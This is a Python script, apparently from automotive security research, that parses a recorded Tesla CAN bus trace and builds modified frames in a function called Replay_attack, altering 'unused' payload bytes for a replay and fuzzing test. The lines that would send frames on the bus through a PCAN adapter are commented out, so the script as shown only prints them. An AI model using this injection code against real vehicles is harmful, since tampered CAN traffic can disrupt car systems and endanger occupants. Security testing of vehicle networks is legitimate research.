import pandas as pd
import matplotlib.pyplot as plt
from matplotlib.pyplot import figure
import numpy as np
import time
from PCANBasic import *
from rich.console import Console


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


cols = ["No", "Time_Offset", "Type", "ID", "Data_Length", 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight']

unused_byte = pd.read_csv("Unused Bytes/Tesla_unused.csv", sep=";")
count = [0, 0]

def Convert_to_Dataframe(path):
    test = pd.read_csv(path, encoding='cp949', index_col=0)
    b = []
    for i in test.index:
        temp = i.split(" ")
        b.append(list(filter(('').__ne__, temp)))
    #final = pd.DataFrame(b, columns = ["No", "Time_Offset", "Type", "ID", "Data_Length", 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight'])
    final = pd.DataFrame(b, columns = cols)
    return final

def Replay_attack(data_iloc):
    all_datas = ""
    time_offset = 0.03
    Fuzzing_attack = TPCANMsg()
    Fuzzing_attack.ID = int(data_iloc[3],16)
    Fuzzing_attack.LEN = int(data_iloc[4])
    Fuzzing_attack.MSGTYPE = PCAN_MESSAGE_STANDARD
    all_datas += str(hex(Fuzzing_attack.ID)) + "\t" + str(Fuzzing_attack.MSGTYPE) + "\t" + str(hex(Fuzzing_attack.LEN)) 
    #EDITED BY DDUMWAMU: INITIALIZE YOUR VARIABLES BEFORE USING IT INSIDE THE FUNCTION YOU ***** hahahaa'
    unused_index = 0

    if data_iloc[3] in list(unused_byte["ID"]):
        unused_index = int(unused_byte[unused_byte["ID"] == data_iloc[3]].iloc[0][1])
        count[0] += 1
        if unused_index == None:
            count[0] -= 1
            return
    else:
        count[1] += 1
        return

    for i in range(int(data_iloc[4])):
        if unused_index == i :
            Fuzzing_attack.DATA[i] = int(unused_byte[unused_byte["ID"] == data_iloc[3]].iloc[0][2], 16) + 1
            all_datas += "\t" + bcolors.OKGREEN + str(hex(Fuzzing_attack.DATA[i])) + bcolors.ENDC
        else:
            Fuzzing_attack.DATA[i] = int(data_iloc[5+i], 16)
            all_datas += "\t" + str(hex(Fuzzing_attack.DATA[i]))
    unused_index = 0
    all_datas += "\n"
    print(all_datas)
    # res = CAN.Write(CAN_BUS, Fuzzing_attack)
    # if res != PCAN_ERROR_OK:
    #     print("Oh nooo")
    #     result = CAN.GetErrorText(res)
    #     print(result)
    #     exit()
    time.sleep(time_offset)


if __name__ == "__main__":
    
    # CAN = PCANBasic()                            #CAN 생성자 
    # CAN_BUS = PCAN_USBBUS6
    # CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
    
    dataset_path = "Dataset\\"
    dataset_name = "Tesla\\배방-학교_CCAN.trc"
    df_dataset = Convert_to_Dataframe(dataset_path+dataset_name)[17:]
    nID = list(dict.fromkeys(df_dataset["ID"]))
    ilo_df = df_dataset.iloc
    l = len(df_dataset)
    start_time = time.time()
    for i in range(l - 1):
        print(bcolors.OKBLUE)
        print(bcolors.OKBLUE + str(ilo_df[i][3]), end="\t")
        print(ilo_df[i][2], end="\t")
        print(ilo_df[i][4], end="\t")
        for j in range(int(ilo_df[i][4])):
            print(ilo_df[i][5+j], end = '\t')
        print(bcolors.ENDC)
        Replay_attack(ilo_df[i])
        print("Replay Count: {0}, Dataset Count: {1}, time_offset: {2}\n".format(count[0], count[1], (time.time() - start_time)))
    
    
    

